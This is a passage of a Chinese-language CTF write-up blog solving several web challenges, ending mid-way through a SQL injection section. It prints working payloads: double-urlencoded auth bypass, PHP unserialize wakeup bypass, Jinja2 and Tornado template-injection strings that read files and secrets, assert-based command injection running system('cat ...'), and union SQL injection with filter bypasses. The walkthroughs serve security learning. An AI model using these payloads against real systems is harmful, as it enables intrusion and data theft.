<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;c&quot;</span>).value;
    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;
        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];
        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];
        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];
        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];
        <span class="hljs-keyword">var</span> s = [t, n, r, i];
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;
            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);
            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
        &#125;
    &#125;
&#125;
<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);
<span class="hljs-keyword">delete</span> _</code></pre>

<p>再看这段js代码中的if语句</p>
<pre><code class="hljs js"><span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>)</code></pre>

<p>参数e的长度为16，其中要包含</p>
<pre><code class="hljs apache"><span class="hljs-attribute">be0f23</span>开头  <span class="hljs-number">233</span>ac   e<span class="hljs-number">98</span>aa结尾     c<span class="hljs-number">7</span>be<span class="hljs-number">9</span></code></pre>

<p>通过if语句后会通过一个算法将flag算出来</p>
<p>ok,那就按if语句的要求写出e</p>
<pre><code class="hljs plain">be0f233ac7be98aa</code></pre>

<p>还可以直接利用</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];
      <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];
      <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];
      <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];
      <span class="hljs-keyword">var</span> s = [t, n, r, i];
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;
          <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);
          s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
      &#125;</code></pre>

<p>在浏览器的console中运行</p>
<p><img src="https://i.loli.net/2020/12/01/fA5vLyShNcro2Ow.png" alt="image-20201201230236591"></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
    <span class="hljs-variable">$_o</span>=strrev(<span class="hljs-variable">$str</span>);
    <span class="hljs-comment">// echo $_o;</span>
        
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;strlen(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;
       
        <span class="hljs-variable">$_c</span>=substr(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);
        <span class="hljs-variable">$__</span>=ord(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;
        <span class="hljs-variable">$_c</span>=chr(<span class="hljs-variable">$__</span>);
        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;   
    &#125; 
    <span class="hljs-keyword">return</span> str_rot13(strrev(base64_encode(<span class="hljs-variable">$_</span>)));
&#125;

highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">/*</span>
<span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span>
<span class="hljs-comment">*/</span>
<span class="hljs-meta">?&gt;</span></code></pre>

<p>了解几个函数的用法</p>
<blockquote>
<p>str_rot13() 函数对字符串执行 ROT13 编码。</p>
<p>ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</p>
<p><strong>提示：</strong>编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。</p>
<p>strrev() 函数反转字符串。</p>
</blockquote>
<p><img src="https://i.loli.net/2020/12/01/LMmUQRWEsx8jceg.png" alt="image-20201201232139218"></p>
<p>解密脚本</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
    <span class="hljs-variable">$s</span> = base64_decode(strrev(str_rot13(<span class="hljs-variable">$str</span>)));
    <span class="hljs-comment">//echo($s);</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;strlen(<span class="hljs-variable">$s</span>);<span class="hljs-variable">$_0</span>++)&#123;
        <span class="hljs-variable">$_c</span>=substr(<span class="hljs-variable">$s</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);
        <span class="hljs-variable">$__</span>=ord(<span class="hljs-variable">$_c</span>)<span class="hljs-number">-1</span>;
        <span class="hljs-variable">$_c</span>=chr(<span class="hljs-variable">$__</span>);
        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;
    &#125;
    <span class="hljs-keyword">echo</span> strrev(<span class="hljs-variable">$_</span>);
&#125;
decode(<span class="hljs-variable">$str</span>);
<span class="hljs-meta">?&gt;</span></code></pre>



<h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>这题应该给个提示的，访问index.phps获取源码。</p>
<p>phps，用御剑和dirsearch都扫不出来，所以必须知道才可能做出来。</p>
<p>给新生赛出题的想法来源，当时做这题的时候费了好大劲才找到index.phps，所以也让让萌新们体验一下找不到的绝望🤣</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>===<span class="hljs-variable">$_GET</span>[id]) &#123;
  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);
  <span class="hljs-keyword">exit</span>();
&#125;

<span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;admin&quot;</span>)
&#123;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span>

Can you anthenticate to this website?</code></pre>



<p>获取id后urldecode之后再赋值给id，要注意上传的参数浏览器会字段一次urldecode，所以这里的admin需要两次urlencode</p>
<p>payload：</p>
<pre><code class="hljs xquery">admin
<span class="hljs-meta">%61</span><span class="hljs-meta">%64</span><span class="hljs-meta">%6D</span><span class="hljs-meta">%69</span><span class="hljs-meta">%6E</span>
<span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span>
GET:
<span class="hljs-built_in">?id</span>=<span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span></code></pre>



<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>很简单的unserialize</p>
<p>利用漏洞，当属性值大于真是属性值的时候会跳过wakeup函数，php版本小于5.6</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;
<span class="hljs-comment">// public function __wakeup()&#123;</span>
<span class="hljs-comment">//     exit(&#x27;bad requests&#x27;);</span>
<span class="hljs-comment">// &#125;</span>
&#125;

<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> xctf();
<span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$c</span>));
<span class="hljs-meta">?&gt;</span></code></pre>

<pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;

GET:
?code=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;</code></pre>



<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>抓包修改MIME为image/jpeg,即可上传成功，之后蚁剑连接拿到flag。</p>
<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>模板注入，和cumtctf华为杯很像，但是没那个难。</p>
<p>首先判断是否存在模板注入，在url后输入 49，显示页面如下，可以确定存在模板注入，因为我们输入的值被其当作变量带入计算。</p>
<p><img src="https://i.loli.net/2020/12/02/NyPSIhg9Yv4Jbzp.png" alt="20201202085851.png"></p>
<p>模板注入原理这篇博客写的很详细：<a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>几个常用的魔术方法</p>
<blockquote>
<p>_<em>class_</em>  返回类型所属的对象 </p>
<p>_<em>mro_</em>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</p>
<p> _<em>base_</em>   返回该对象所继承的基类 // <strong>base</strong>和<strong>mro</strong>都是用来寻找基类的 </p>
<p>_<em>subclasses_</em>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 </p>
<p>_<em>init_</em>  类的初始化方法</p>
<p> _<em>globals_</em>  对包含函数全局变量的字典的引</p>
<p>直接开始这题</p>
</blockquote>
<p>1.查看所有模块，其中第41个模块file和72个模块，包含文件读取的相关操作，可以利用</p>
<pre><code class="hljs clojure">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code></pre>



<p><img src="https://i.loli.net/2020/12/02/j9Ahcr8sOaSyEPt.png" alt="image-20201202090652367"></p>
<p>2.列出文件目录</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(<span class="hljs-name">&#x27;.&#x27;</span>)&#125;&#125;</span></code></pre>



<p><img src="https://i.loli.net/2020/12/02/hSIWxNvpBwqe2Qt.png" alt="image-20201202094836434"></p>
<p>3.读取flag</p>
<pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()</code></pre>

<p><img src="https://i.loli.net/2020/12/02/Qxdc9U1GbrzYvSg.png" alt="image-20201202094926424"></p>
<h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>这又是web服务器和web应用框架，会不会和flask框架一样存在模板模板注入</p>
<h3 id="0x1-原理"><a href="#0x1-原理" class="headerlink" title="0x1 原理"></a>0x1 原理</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过两个大括号进行传递变量和执行简单的表达式。</p>
<h3 id="0x2-解题"><a href="#0x2-解题" class="headerlink" title="0x2 解题"></a>0x2 解题</h3><p>1.先看看题目给的连接</p>
<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">220.249.52.133:43538</span>/file?filename=/welcome.txt&amp;filehash=<span class="hljs-number">34</span>b<span class="hljs-number">3</span>f<span class="hljs-number">8</span>fdcf<span class="hljs-number">2</span>ec<span class="hljs-number">4394</span>a<span class="hljs-number">5</span>b<span class="hljs-number">9</span>b<span class="hljs-number">20580</span>c<span class="hljs-number">0096</span></code></pre>

<p>提交的参数是文件名和文件的hash值</p>
<p>并且给了三web页面</p>
<pre><code class="hljs jboss-cli"><span class="hljs-string">/flag.txt</span>
<span class="hljs-string">/welcome.txt</span>
<span class="hljs-string">/hints.txt</span></code></pre>

<p>flag.txt</p>
<pre><code class="hljs jboss-cli">flag in <span class="hljs-string">/fllllllllllllag</span></code></pre>

<p>hints.txt给的提示</p>
<pre><code class="hljs stylus">/hints.txt
<span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(cookie_secret+md5(filename)</span></span>)</code></pre>

<p>这就知道了<code>filehash</code>的来源了</p>
<p>2.读取flag.txt就必须构造payload：</p>
<pre><code class="hljs awk"><span class="hljs-regexp">//</span>?filename=<span class="hljs-regexp">/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/</span>fllllllllllllag))</code></pre>

<p>但是我们不知道cookie_secret 的值，先提交试试</p>
<p><img src="https://i.loli.net/2020/12/02/7GzhFyxqJT9ZwNH.png" alt="image-20201202100637168"></p>
<p>出现了这个错误页面，并且我们可以控制msg的值，存在模板注入</p>
<p>3.输入<code>msg=&#123;&#123;handler.settings&#125;&#125;</code>,获取当前的环境变量，得到cookie_sercet的值 </p>
<p><img src="https://i.loli.net/2020/12/02/CijHGvlO7Pft8ur.png" alt="image-20201202101520762"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$filename</span> = md5(<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>);
<span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;cb82b218-07e3-491d-a302-532dbae27e6a&#x27;</span>;
<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$s</span>.<span class="hljs-variable">$filename</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>于是构造出payload</p>
<pre><code class="hljs routeros">
?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=0caf8cf587a036fabea3fa65f058c275</code></pre>

<p>拿到flag</p>
<blockquote>
<p>参考:</p>
<p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a></p>
</blockquote>
<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><pre><code class="hljs php">import flask
import os

app = flask.Flask(__name__)
app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)


@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)
def index():
    <span class="hljs-keyword">return</span> open(<span class="hljs-keyword">__file__</span>).read()

@app.route(<span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span>)
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="hljs-keyword">for</span> c in blacklist]) + s

    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    app.run(debug=<span class="hljs-literal">True</span>)</code></pre>

<h3 id="0x1考察点"><a href="#0x1考察点" class="headerlink" title="0x1考察点"></a>0x1考察点</h3><p>很明显的flask框架</p>
<p>存在模板注入，但是对()进行了过滤，并将config , self 加入了黑名单，<code>Web_python_template_injection</code>这题的payload就没法用了。</p>
<p><img src="https://i.loli.net/2020/12/02/JT7Wnk3u86IVHQe.png" alt="image-20201202103810281"></p>
<h3 id="0x2构造payload"><a href="#0x2构造payload" class="headerlink" title="0x2构造payload"></a>0x2构造payload</h3><p>可以使用内置函数<code>get_flashed_messages()</code>，又因为config在current_app里面，所以我们可以构造payload</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span></code></pre>



<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>看到了git，可能存在git源码泄露</p>
<p><img src="https://i.loli.net/2020/12/02/M6zWQwdqsvRj1mD.png" alt="git-1"></p>
<p>访问<a href="http://220.249.52.133:44852/.git/，确定存在源码泄露，使用githack下载源码，目录结构如图，templates下存在flag.php,它就是我们的目标。">http://220.249.52.133:44852/.git/，确定存在源码泄露，使用githack下载源码，目录结构如图，templates下存在flag.php,它就是我们的目标。</a></p>
<p><img src="https://i.loli.net/2020/12/02/BXmiCHp5bocy7Tn.png" alt="git-2"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;
	<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];
&#125; <span class="hljs-keyword">else</span> &#123;
	<span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;
&#125;
<span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;

<span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span>
assert(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);

<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span>
assert(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);

<span class="hljs-meta">?&gt;</span></code></pre>

<p><strong>file_exists</strong>函数</p>
<p><img src="https://i.loli.net/2020/12/02/VngSuP6h2W5xbHO.png" alt="git-3">fil</p>
<p>输入</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=flag</code></pre>

<p>页面显示为空，因为file_exists只能判断文件是否存在，无法返回文件内容，这就用利用cat读取内容了。因为没有对page做其他的过滤，我们可以利用assert + system，达到命令注入的目的。</p>
<p><strong>注意：</strong>assert函数会将传入的参数当作php代码执行</p>
<p>构造payload，这里就像sql注入的语句，闭合前面的语句并填写自己想要的语句</p>
<pre><code class="hljs xquery">先测试一下想法对不对
//?page=<span class="hljs-string">&#x27;) or phpinfo();#</span>
<span class="hljs-string">//assert(&quot;file_exists(&#x27;</span><span class="hljs-variable">$file</span><span class="hljs-string">&#x27;) or phpinfo();)#</span>
<span class="hljs-string">?page=&#x27;</span>)<span class="hljs-meta">%20or</span><span class="hljs-meta">%20phpinfo</span>()<span class="hljs-meta">%3B</span><span class="hljs-meta">%23</span>
显示出了phpinfo(),所以思路是对的
继续构造
//?page=<span class="hljs-string">&#x27;) or system(&quot;cat templates/flag.php&quot;); #</span>
<span class="hljs-string">最后的payload</span>
<span class="hljs-string"></span>
<span class="hljs-string">?page=&#x27;</span>)<span class="hljs-meta">%20or</span><span class="hljs-meta">%20system</span>(<span class="hljs-meta">%22cat</span><span class="hljs-meta">%20templates</span><span class="hljs-meta">%2Fflag</span>.php<span class="hljs-meta">%22</span>)<span class="hljs-meta">%3B</span><span class="hljs-meta">%23</span></code></pre>

<p><img src="https://i.loli.net/2020/12/02/Z9L2rxqjBgMyViv.png" alt="git-4"></p>
<p><img src="https://i.loli.net/2020/12/02/U4TOzpaGBhHKlIV.png" alt="git-5"></p>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><h3 id="0x1-sql注入"><a href="#0x1-sql注入" class="headerlink" title="0x1 sql注入"></a>0x1 sql注入</h3><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
<p>接下来继续注入的常规操作。</p>
<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
<p><strong>爆表名</strong></p>
<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">Notice</span>: unserialize(): Error at <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> bytes <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">view</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">31</span>

提示存在反序列化，但是不知道怎么用继续爆表。</code></pre>

<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
<pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#

?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#

/<span class="hljs-comment">/**no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS**</span></code></pre>

<p>爆出一大堆列名。直接读取data的内容</p>
<pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> users),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> #</code></pre>

<p>发现内容是注册时信息保存为序列化内容</p>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;22.github.io&quot;</span>;&#125;</code></pre>

<p>到这里就不知道怎么办了。。。</p>
<p><strong>做到这里我们大致知道了下面的信息：</strong></p>
<blockquote>
<p>view.php进行了对某个数据进行反序列化(unserializa)操作，从上面跑出的data分析是对data进行了 反序列化操作,在上一步骤中我们得到了user表有4列分别为no，passwd，data，username，并没有 单独存放blog列，所以blog显示应该是从data列取出再进行反序列化</p>
</blockquote>
<h3 id="0x02代码审计"><a href="#0x02代码审计" class="headerlink" title="0x02代码审计"></a>0x02代码审计</h3><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
<p>源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
